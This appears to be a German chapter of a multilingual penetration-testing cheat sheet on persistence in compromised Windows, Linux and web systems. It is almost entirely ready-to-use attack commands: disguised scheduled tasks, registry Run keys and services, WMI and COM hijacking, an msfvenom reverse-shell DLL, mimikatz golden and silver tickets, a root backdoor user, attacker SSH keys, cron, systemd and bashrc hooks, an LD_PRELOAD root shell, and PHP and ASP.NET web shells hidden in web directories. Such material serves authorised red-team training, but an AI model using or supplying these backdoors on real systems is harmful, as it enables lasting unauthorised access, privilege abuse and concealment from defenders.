# 🔒 Phase 5: Persistenz (Zugang aufrechterhalten)

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](05-Persistence.tr.md) • [🇬🇷 Ελληνικά](05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Ziel:** Den Zugang zum kompromittierten System auch nach Neustarts oder einer Erkennung aufrechterhalten.

---

## 🖥️ Persistenz unter Windows

### Geplante Aufgaben
```cmd
# Geplante Aufgabe erstellen (läuft als SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Mit einem bestimmten Benutzer
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# Beim Systemstart
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Jede Stunde
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Aufgaben auflisten
schtasks /query /fo LIST /v

# Aufgabe löschen
schtasks /delete /tn "TaskName" /f
```

### Run-Schlüssel der Registry
```cmd
# HKCU – Aktueller Benutzer (keine Administratorrechte erforderlich)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM – Alle Benutzer (Administratorrechte erforderlich)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (einmal ausführen, danach Eintrag löschen)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Autostartordner
```cmd
# Aktueller Benutzer
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Alle Benutzer (Administratorrechte erforderlich)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Dienste
```cmd
# Dienst erstellen (Administratorrechte erforderlich)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Vorhandenen Dienst ändern
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### WMI-Ereignisabonnements
```powershell
# WMI-Persistenz einrichten
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL-Hijacking / Suchreihenfolge
```cmd
# Nach Möglichkeiten für DLL-Hijacking suchen
# Schädliche DLL im Anwendungsverzeichnis ablegen
# Häufige Ziele:
# - Programmdateien ohne vollständige DLL-Pfade
# - Fehlende DLLs

# Schädliche DLL erstellen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM-Hijacking (COM-Auflösung beeinflussen)
```powershell
# COM-Objekte finden
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Hijacking einrichten
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden Ticket – Dauerhafter Zugriff als Domänenadministrator
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket – Dauerhafter Dienstzugriff
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Persistenz unter Linux

### Cronjobs
```bash
# Benutzer-Crontab
crontab -e
# Hinzufügen: * * * * * /tmp/shell.sh

# System-Crontab
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Cron-Verzeichnisse
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### SSH-Schlüssel
```bash
# Eigenen öffentlichen Schlüssel zu authorized_keys hinzufügen
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# root-Zugriff
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Backdoor-Benutzer
```bash
# Benutzer mit root-Rechten hinzufügen
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Alternativ direkt zu /etc/passwd hinzufügen
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### SUID-Programm
```bash
# bash kopieren und SUID setzen
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Als root ausführen
/tmp/.hidden -p
```

### Systemd-Dienst
```bash
# Dienstdatei erstellen
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Aktivieren und starten
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Zur bashrc des Benutzers hinzufügen
echo '/tmp/shell &' >> ~/.bashrc

# Zum globalen profile hinzufügen
echo '/tmp/shell &' >> /etc/profile

# Zu bash_profile hinzufügen
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Schädliche gemeinsam genutzte Bibliothek erstellen
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Zu LD_PRELOAD hinzufügen
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web-Shell
```bash
# PHP-Web-Shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Weniger auffällig
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Persistenz in Webanwendungen

### Ablageorte für Web-Shells
```bash
# Häufige Ablageorte für Web-Shells
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET-Web-Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Kurzreferenz

### Persistenzmethoden unter Windows

| Methode | Speicherort | Berechtigung |
|--------|----------|-----------|
| Registry-Run-Schlüssel | HKCU/HKLM | Benutzer/Administrator |
| Geplante Aufgabe | Aufgabenplanung | Benutzer/Administrator |
| Autostartordner | AppData/ProgramData | Benutzer/Administrator |
| Dienst | Dienste | Admin |
| WMI | WMI-Abonnement | Admin |
| COM-Hijacking | HKCU CLSID | Benutzer |

### Persistenzmethoden unter Linux

| Methode | Speicherort | Berechtigung |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| SSH-Schlüssel | ~/.ssh/authorized_keys | Benutzer |
| SUID | Programm mit +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | Benutzer |

---

## 🔗 Weiterführende Cheatsheets

- [PowerShell](../../PowerShell/README.md)
- [Linux-Befehle](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**Vorherige Phase:** [← 04 - Laterale Bewegung (Lateral Movement)](./04-Lateral-Movement.de.md)

**Nächste Phase:** [06 - Umgehung von Schutzmaßnahmen (Defense Evasion) →](./06-Defense-Evasion.de.md)

---

## Hinweise zur deutschen Ausgabe

> **Hinweise zu den Vorlagen:** Persistenz bedeutet, einen erneuten Zugang vorzubereiten; sie garantiert keinen dauerhaften Zugriff nach einer Erkennung. `IEX(payload)`, `{CLSID}`, `AAAA...your_key...` und die Hashwerte sind Platzhalter. Die gezeigten SUID- und Systemdienstverfahren setzen passende Schreib- bzw. Administratorrechte voraus. Eine gewöhnliche EXE ist nicht automatisch als Windows-Dienst implementiert. Die `LD_PRELOAD`-Vorlage ist ein unvollständiges C-Beispiel; verwendete Bibliotheksfunktionen benötigen passende Deklarationen. Die Originalbeispiele bleiben unverändert.
